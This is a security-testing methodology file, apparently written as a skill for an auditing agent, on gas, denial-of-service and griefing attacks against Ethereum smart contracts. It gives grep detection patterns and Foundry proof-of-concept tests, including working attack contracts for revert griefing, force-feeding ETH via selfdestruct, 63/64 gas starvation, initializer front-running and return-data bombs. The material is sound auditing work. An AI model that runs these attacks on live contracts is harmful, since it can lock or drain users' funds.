---
name: gas-dos-griefing
category: web3
description: Gas and denial-of-service attack patterns covering block gas limit exhaustion, unbounded loops, revert griefing, 63/64 gas rule exploitation, storage bloat attacks, force-feeding ETH via selfdestruct, and push-vs-pull payment pattern analysis
depends_on: []
---

# Gas, DoS, and Griefing Attacks

Security testing for denial-of-service and griefing vulnerabilities in smart contracts. Focus on block gas limit exhaustion, unbounded loop iteration, revert-based DoS, 63/64 gas rule exploitation, storage bloat, force-feeding ETH, and push-vs-pull payment pattern analysis.

## When to Use

- Smart contracts iterate over user-controlled arrays or mappings (reward distribution, batch operations, voting tallies)
- Protocol performs batch transfers, dividend payouts, or multi-recipient operations in a single transaction
- Contracts rely on `address(this).balance` for accounting or logic decisions
- Relayer or meta-transaction patterns where the submitter controls gas allocation
- Permissionless functions allow anyone to append to storage arrays or grow protocol state
- Proxy or initializer patterns where front-running deployment or initialization is possible
- External calls occur inside loops or batch operations where one failure could block the entire batch

## Methodology

### 1. Block Gas Limit DoS

**Unbounded Loop Iteration**
- Storage arrays with no upper bound grow over protocol lifetime
- Functions iterating over all holders, all proposals, all pending withdrawals, or all reward recipients
- Gas cost increases linearly (or worse) with array length; eventually exceeds block gas limit (~30M on mainnet)
- Cited: Fomo3D block stuffing attack (2018) -- attacker filled blocks with high-gas transactions to prevent others from calling `endRound()` before the timer expired, winning the 10,469 ETH jackpot

**Block Stuffing**
- Attacker fills blocks with high-gas-price transactions to delay time-sensitive operations
- Targets: auction closings, oracle updates, liquidation windows, governance deadlines
- Cost: attacker pays gas for stuffing; profitable when the blocked operation has higher value
- Particularly dangerous when combined with tight time windows (1-2 blocks to act)

**Gas Cost Escalation Over Lifetime**
- State that grows monotonically (append-only arrays, ever-growing mappings) increases cost of operations that traverse it
- Even if safe at launch, the function may become uncallable after months of operation
- Example: reward distribution loops that iterate over all depositors; a `delete` on individual elements leaves gaps but does not reduce iteration cost

**Detection Patterns**
```bash
# Find for/while loops iterating over storage arrays
grep -rn "for.*\.length" contracts/
grep -rn "while.*\.length\|while.*<.*length" contracts/

# Find unbounded array declarations
grep -rn "address\[\]\|uint256\[\]\|mapping.*\[\]" contracts/

# Find push() to storage arrays in public/external functions
grep -rn "\.push(" contracts/
```

**Foundry PoC Template -- Unbounded Loop DoS**
```solidity
function test_unboundedLoopDoS() public {
    // Phase 1: Grow the array to a dangerous size
    for (uint256 i = 0; i < 10_000; i++) {
        target.addParticipant(address(uint160(i + 1)));
    }

    // Phase 2: Measure gas for the operation that iterates over the array
    uint256 gasBefore = gasleft();
    target.distributeRewards();
    uint256 gasUsed = gasBefore - gasleft();

    // Phase 3: Assert gas exceeds block limit threshold
    // 30M is current mainnet block gas limit
    emit log_named_uint("Gas used", gasUsed);
    assertTrue(gasUsed > 25_000_000, "Gas usage should approach block limit");
}
```

### 2. Revert-Based DoS

**External Call in Loop**
- A single revert in a batch operation (transfer, airdrop, refund) blocks the entire batch
- If one recipient is a contract that reverts in `receive()` or `fallback()`, no one gets paid
- Common in push-based distribution: `for (i; i < recipients.length; i++) { payable(recipients[i]).transfer(amount); }`

**Pull-Over-Push Pattern Violation**
- Push pattern: contract sends funds to recipients (fragile -- any revert blocks all)
- Pull pattern: recipients withdraw their own funds (robust -- one failure does not affect others)
- Every push-based multi-recipient transfer is a potential DoS vector

**Blacklisted Token Transfer**
- USDC/USDT have blacklist functionality; a blacklisted address causes `transfer()` to revert
- If a protocol forces a transfer to a blacklisted address (e.g., refund, reward claim on behalf), the operation reverts for everyone
- Applies to any token with blocklist/pausable behavior

**ERC-721 safeTransfer DoS**
- `safeTransferFrom` calls `onERC721Received` on the recipient
- A malicious contract can revert in `onERC721Received` to block transfers
- Affects batch NFT operations, marketplace sales, and liquidation of NFT collateral

**Detection Patterns**
```bash
# Find external calls inside loops
grep -rn -A5 "for.*{" contracts/ | grep -E "\.transfer\(|\.send\(|\.call\{|safeTransfer"

# Find push-based payment patterns
grep -rn "\.transfer(\|\.send(" contracts/

# Find safeTransferFrom in batch contexts
grep -rn "safeTransferFrom" contracts/

# Find token transfers in loops (ERC20)
grep -rn "\.transfer(\|\.safeTransfer(" contracts/ | grep -v "import\|interface\|abstract"
```

**Foundry PoC Template -- Revert Griefing**
```solidity
contract MaliciousRecipient {
    receive() external payable {
        revert("I refuse your ETH");
    }
}

function test_revertDoS() public {
    // Insert malicious recipient into the batch
    MaliciousRecipient blocker = new MaliciousRecipient();
    target.addRecipient(address(blocker));
    target.addRecipient(address(0xBEEF)); // legitimate recipient

    // Attempt batch distribution -- should revert for all
    vm.expectRevert();
    target.distributeAll();
}
```

### 3. 63/64 Gas Rule Exploitation

**EIP-150 Mechanics**
- When making an external call, the caller retains 1/64 of remaining gas; inner call receives at most 63/64
- If remaining gas is low, the inner call gets even less: `innerGas = (gasleft() * 63) / 64`
- The outer call can succeed (has its 1/64 reserved) even if the inner call runs out of gas and fails silently

**Relayer / Meta-Transaction Attack**
- Relayer submits a meta-transaction with precisely enough gas for the outer function to succeed
- The inner call (the actual user operation) runs out of gas and reverts, but the outer frame succeeds
- The relayer marks the meta-tx as "executed" (nonce consumed) even though the user action failed
- The user's nonce is burned, and they must re-sign; the relayer can repeat this indefinitely

**Precise Gas Control Attack**
- Attacker calculates exact gas needed for outer logic (~50K) plus the 1/64 retained
- Sends tx with `gaslimit = outerGas + (innerGas * 64 / 63)` where `innerGas` is insufficient
- The inner call fails silently if the outer code does not check the return value
- Especially dangerous with low-level `.call()` that returns `(bool success, bytes memory data)` where `success` is not checked

**Mitigation: gasleft() Validation**
```solidity
// Before the external call, ensure enough gas for the inner operation
require(gasleft() >= innerGasRequirement * 64 / 63 + outerGasBuffer, "Insufficient gas");
(bool success, ) = target.call{gas: innerGasRequirement}(data);
require(success, "Inner call failed");
```

**Detection Patterns**
```bash
# Find relayer/meta-tx patterns
grep -rn "executeMetaTransaction\|execute.*meta\|relay\|forwarder" contracts/

# Find low-level calls without return value checks
grep -rn "\.call(" contracts/ | grep -v "require\|assert\|if.*success\|success,"

# Find gas forwarding patterns
grep -rn "gasleft()\|gas:" contracts/
```

**Foundry PoC Template -- 63/64 Gas Griefing**
```solidity
function test_63_64_gasGriefing() public {
    // Calculate gas to make outer succeed but inner fail
    // Outer function needs ~50K gas; inner needs ~200K
    // Provide enough for outer but starve inner via 63/64 rule
    uint256 preciseGas = 80_000; // enough for outer, not enough for inner

    (bool success, ) = address(target).call{gas: preciseGas}(
        abi.encodeWithSelector(target.executeOnBehalf.selector, user, data)
    );

    // Outer call succeeds (returns true) but inner operation failed
    assertTrue(success, "Outer frame should succeed");
    // Verify the user's action was NOT executed despite success=true
    assertFalse(target.actionCompleted(user), "User action should have failed silently");
    // Verify nonce was consumed (permanent damage)
    assertEq(target.nonces(user), 1, "Nonce burned despite failed action");
}
```

### 4. Storage Bloat Attacks

**Permissionless Storage Growth**
- Any function callable without access control that appends to a storage array or creates new mapping entries
- Cost to attacker: gas for storage writes (~20K gas per new slot, ~5K per modification)
- Impact: downstream functions iterating over the bloated storage become increasingly expensive or uncallable

**Attack Vectors**
- Unbounded proposal lists: anyone can create proposals, each stored in an array that governance must iterate
- Unbounded participant lists: permissionless registration grows a list that reward distribution traverses
- Unbounded reward epochs: each epoch creates new storage entries; claiming iterates over all unclaimed epochs
- Mapping of mappings: creating entries in nested mappings that are enumerated via auxiliary arrays

**Economic Analysis**
- Storage write cost: ~20K gas per new slot at 30 gwei = ~0.0006 ETH per entry
- To bloat an array to 10,000 entries: ~6 ETH in gas
- To make a function that iterates the array hit the 30M gas limit: depends on per-iteration cost
- If each iteration costs ~3K gas: 10,000 iterations = 30M gas (block limit reached)

**Detection Patterns**
```bash
# Find push() in public/external functions (permissionless storage growth)
grep -rn "\.push(" contracts/ | xargs -I{} grep -l "public\|external" {}

# Find array.length used in loop bounds
grep -rn "for.*\.length" contracts/

# Find functions that create new storage entries without access control
grep -rn "mapping.*\[.*\] =" contracts/
```

### 5. Force-Feeding ETH

**selfdestruct(target)**
- `selfdestruct(payable(target))` sends the contract's entire ETH balance to `target` regardless of whether `target` has a `receive()` or `fallback()` function
- The recipient cannot reject the ETH; no code executes on the recipient during a selfdestruct transfer
- Post-Dencun (EIP-6780): `selfdestruct` only sends ETH without destroying the contract code, UNLESS called within the same transaction as contract creation
- The force-feeding mechanism still works post-Dencun; only code destruction behavior changed

**Other Force-Feed Vectors**
- Coinbase reward: a validator (block proposer) can direct the block reward to any address
- Pre-deployment balance: ETH sent to a CREATE2-predicted address before the contract is deployed; the contract inherits the balance upon deployment
- Block.coinbase transfer: mining/validating a block and setting the reward recipient to the target contract

**Impact: Broken Accounting**
- Any contract that uses `address(this).balance` for logic decisions is vulnerable
- Common patterns: `require(address(this).balance >= expectedBalance)`, using balance as accounting truth, asserting balance equals sum of deposits
- If `tracked_balance` (sum of deposits) diverges from `address(this).balance` (actual), protocol logic can break
- Example: a vault that calculates share price as `address(this).balance / totalShares` can be manipulated by force-feeding ETH to inflate the price

**Detection Patterns**
```bash
# Find reliance on address(this).balance
grep -rn "address(this).balance\|address(this)\.balance" contracts/

# Find balance comparisons and assertions
grep -rn "\.balance ==" contracts/
grep -rn "\.balance >=" contracts/
grep -rn "\.balance <=" contracts/

# Find selfdestruct usage (potential attack vector from other contracts)
grep -rn "selfdestruct\|SELFDESTRUCT" contracts/
```

**Foundry PoC Template -- Force-Feed Balance Manipulation**
```solidity
contract ForceFeeder {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

function test_forceFeedBreaksAccounting() public {
    uint256 trackedBalance = target.totalDeposited();
    uint256 actualBalance = address(target).balance;
    assertEq(trackedBalance, actualBalance, "Balances should match initially");

    // Force-feed 1 ETH via selfdestruct
    new ForceFeeder{value: 1 ether}(payable(address(target)));

    // Accounting is now broken
    uint256 newActualBalance = address(target).balance;
    assertGt(newActualBalance, trackedBalance, "Actual balance should exceed tracked");

    // Demonstrate impact: share price inflated, withdrawal amounts wrong, etc.
    uint256 inflatedSharePrice = target.sharePrice();
    // Assert the share price is higher than expected due to force-fed ETH
    assertGt(inflatedSharePrice, expectedSharePrice, "Share price inflated by force-feed");
}
```

### 6. Griefing Attacks

**Front-Running Initialization**
- Uninitialized proxy: attacker calls `initialize()` before the deployer, setting themselves as owner
- CREATE2 front-running: attacker deploys a contract at the predicted address before the legitimate deployer
- Bricking: attacker initializes with parameters that make the contract permanently unusable (zero address admin, max values, self-referencing circular dependencies)

**Dust Deposit Griefing**
- Minimum balance requirements: attacker deposits the minimum amount to occupy a slot, preventing the legitimate user from using it
- Share rounding: depositing tiny amounts (1 wei) to create shares that round to zero, trapping dust in the vault
- Minimum withdrawal threshold: depositing just below the threshold prevents withdrawal until more is added

**Yield Harvest Sandwiching**
- Attacker front-runs a `harvest()` or `compound()` call with a large deposit
- Harvest executes: rewards are distributed proportionally, attacker gets a share of rewards they did not earn
- Attacker back-runs with a withdrawal, extracting unearned yield
- Detection: check if reward distribution is time-weighted or snapshot-based vs current-balance-based

**Vault and Pool Blocking**
- Deposit cap griefing: attacker fills the vault to its maximum capacity with minimum-value deposits
- Token approval griefing: front-running approval changes (approve from A to B; attacker spends A first, then B)
- Liquidation blocking: in lending protocols, depositing collateral on behalf of a borrower to prevent profitable liquidation

**Detection Patterns**
```bash
# Find initialize/init functions
grep -rn "function initialize\|function init\b" contracts/

# Find CREATE2 deployment patterns
grep -rn "CREATE2\|create2\|new.*{salt:" contracts/

# Find reward distribution without time-weighting
grep -rn "rewardPerShare\|rewardPerToken\|accRewardPerShare" contracts/

# Find deposit cap checks
grep -rn "maxDeposit\|depositCap\|maxTotalAssets" contracts/
```

**Foundry PoC Template -- Initialize Front-Run**
```solidity
function test_initializeFrontRun() public {
    // Deploy proxy pointing to implementation (not yet initialized)
    TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
        address(impl), address(admin), ""
    );
    TargetContract proxied = TargetContract(address(proxy));

    // Attacker front-runs initialization
    vm.prank(attacker);
    proxied.initialize(attacker, maliciousParams);

    // Attacker is now the owner
    assertEq(proxied.owner(), attacker, "Attacker should own the contract");

    // Legitimate deployer's initialize call reverts
    vm.prank(deployer);
    vm.expectRevert("Initializable: contract is already initialized");
    proxied.initialize(deployer, legitimateParams);
}
```

### 7. External Call Gas Consumption

**Return Data Bomb**
- A malicious contract returns an enormous amount of data (e.g., `return(0, 1_000_000)` in assembly)
- The caller copies this return data into memory, consuming gas proportional to the data size
- Even if the caller does not use the return data, Solidity automatically copies it
- Mitigation: use low-level assembly to limit return data copying, or use `excessivelySafeCall` from Nomad

**Phantom Function Calls**
- Calling a function on an address with no code (EOA or empty contract) succeeds silently and returns empty data
- The caller wastes gas on the call setup and receives no useful result
- Especially dangerous when iterating over a list of addresses where some may have been self-destructed
- Check: verify `code.length > 0` or use `Address.isContract()` before making external calls

**Cross-Contract Call Chain Gas Exhaustion**
- Each hop in a call chain consumes gas for the call overhead plus the 63/64 rule
- Deep call chains (A calls B calls C calls D) progressively starve later calls
- If the final call requires significant gas (storage writes, loops), it may fail even if the initial transaction had ample gas

**Unbounded Return Data Copying**
- `abi.decode` on untrusted return data can consume excessive memory and gas
- A malicious contract can return data that triggers quadratic memory expansion in the caller
- Mitigation: specify maximum expected return data length and use assembly-level return data handling

**Detection Patterns**
```bash
# Find external calls without gas limits
grep -rn "\.call(\|\.delegatecall(\|\.staticcall(" contracts/ | grep -v "gas:"

# Find potential return data bomb targets
grep -rn "abi.decode.*call" contracts/

# Find calls to potentially empty addresses
grep -rn "\.call{" contracts/ | grep -v "isContract\|code.length\|extcodesize"

# Find deep call chains (interfaces calling other interfaces)
grep -rn "interface.*{" contracts/ | head -20
```

**Foundry PoC Template -- Return Data Bomb**
```solidity
contract ReturnDataBomb {
    fallback() external payable {
        assembly {
            // Return 1MB of data -- caller must copy it all
            return(0, 1048576)
        }
    }
}

function test_returnDataBomb() public {
    ReturnDataBomb bomb = new ReturnDataBomb();

    // Measure gas for a normal call vs the data bomb
    uint256 gasBefore = gasleft();
    (bool success, bytes memory data) = address(bomb).call("");
    uint256 gasUsed = gasBefore - gasleft();

    emit log_named_uint("Gas consumed by return data bomb", gasUsed);
    // The call succeeds but consumes excessive gas copying return data
    assertTrue(success, "Call should succeed");
    assertTrue(gasUsed > 500_000, "Should consume excessive gas from data copying");
}
```

## Key Commands

```bash
# Foundry
forge build                                    # Compile contracts
forge test --match-test test_dos -vvv          # Run DoS-specific tests with traces
forge test --gas-report                        # Gas report for all functions

# Measure gas per function call
cast estimate {contract} "functionName(args)" --rpc-url {rpc}

# Check block gas limit on target chain
cast block latest --field gasLimit --rpc-url {rpc}

# Check contract balance (force-feed detection)
cast balance {contract} --rpc-url {rpc}

# Storage inspection for array lengths
cast storage {contract} {slot} --rpc-url {rpc}
forge inspect {Contract} storage-layout

# Slither detectors for DoS patterns
slither . --detect costly-loop,calls-loop,msg-value-loop,controlled-array-length

# Find all loops in the codebase
grep -rn "for (.*;" contracts/
grep -rn "while (" contracts/
```

## Validation

- Demonstrate unbounded loop DoS by growing an array to 10K+ entries and showing the iterating function exceeds the block gas limit or reverts with out-of-gas
- Show revert griefing with a malicious `receive()` or `onERC721Received` that blocks an entire batch operation, preventing legitimate users from receiving funds
- Prove 63/64 gas exploitation with a meta-transaction where the relayer provides exact gas to make the outer call succeed while the inner call silently fails, burning the user's nonce
- Confirm force-feed impact by sending ETH via selfdestruct and showing that `address(this).balance`-dependent logic produces incorrect results (wrong share price, broken withdrawals, bypassed invariant checks)
- Document storage bloat economics: cost to attacker in gas/ETH vs impact on protocol (function becomes uncallable, or gas cost exceeds economic value of the operation)
- For each finding, quantify the concrete impact: number of users affected, funds locked or lost, time window of the attack, and cost to the attacker vs damage to the protocol
